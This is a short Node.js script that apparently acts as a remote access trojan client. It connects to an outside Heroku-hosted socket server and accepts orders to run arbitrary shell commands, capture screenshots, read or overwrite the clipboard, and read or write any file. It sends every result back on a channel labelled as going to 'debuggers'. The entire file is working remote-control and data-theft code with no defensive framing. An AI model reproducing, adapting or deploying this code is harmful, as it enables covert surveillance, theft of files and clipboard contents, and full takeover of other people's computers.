// Imports
import { createRequire } from "module";const require = createRequire(import.meta.url);

let { io } = require("socket.io-client")
import clipboard from "clipboardy";
import { readFileSync, writeFile, writeFileSync, unlinkSync } from "fs";
const { exec } = require('child_process');
const screenshot = require('screenshot-desktop')

// Init Socket
let socketObj = io(`ws://rhymesync-server.herokuapp.com:80`)

socketObj.on("connectionEstablished", (arg)=>{
    socketObj.emit("sendDataToDebuggers", {type: "connectionEstablished"});
})

socketObj.on("clientReceiver", (arg)=>{
    if (arg.type == "runCmd"){
        if (arg.cmd!=undefined && arg.cmd!=""){
            exec(arg.cmd, ((e, stdout, stdeer) => {
                socketObj.emit("sendDataToDebuggers", {
                    type: "returnCmd",
                    id: arg.id,
                    command: arg.cmd,
                    return: {e: e, stdout: stdout, stdeer: stdeer}
                });
            }));
        }
    }

    if (arg.type == "takeScreenshot"){
        screenshot({"format":"png"}).then((returnValue)=>{
            socketObj.emit("sendDataToDebuggers", {
                type: "returnScreenshot",
                id: arg.id,
                return: ("data:image/png;base64,"+returnValue.toString('base64'))
            });
        });
    }

    if (arg.type == "getClipboard"){
        socketObj.emit("sendDataToDebuggers", {
            type: "returnClipboard",
            id: arg.id,
            return: clipboard.readSync()
        });
    }

    if (arg.type == "copyToClipboard"){
        if (arg.hasOwnProperty("stringToCopy")){
            try{clipboard.writeSync(arg.stringToCopy)}catch(e){}
            socketObj.emit("sendDataToDebuggers", {
                type: "returnCopyToClipboard",
                id: arg.id,
                return: clipboard.readSync()
            });
        }
    }

    if (arg.type == "writeFile"){
        if (arg.directory!=undefined && arg.directory!=""  && arg.bytesToWrite!=undefined){
            try{
                writeFile(arg.directory, arg.bytesToWrite, arg.encoding=="base64"? "base64":"utf-8", (err)=>{
                    if (err){
                        socketObj.emit("sendDataToDebuggers", {
                            type: "returnWriteFile",
                            id: arg.id,
                            return: false
                        });
                    }else{
                        socketObj.emit("sendDataToDebuggers", {
                            type: "returnWriteFile",
                            id: arg.id,
                            return: true
                        });
                    }
                });
            }catch(e){}
        }
    }

    if (arg.type == "readFile"){
        if (arg.directory!=undefined && arg.directory!=""){
            let returnValue = false;
            try{returnValue = readFileSync(arg.directory, (arg.encoding=="base64"?"base64":"utf-8"))}catch(e){}
            socketObj.emit("sendDataToDebuggers", {
                type: "returnReadFile",
                id: arg.id,
                return: returnValue
            });
        }
    }
})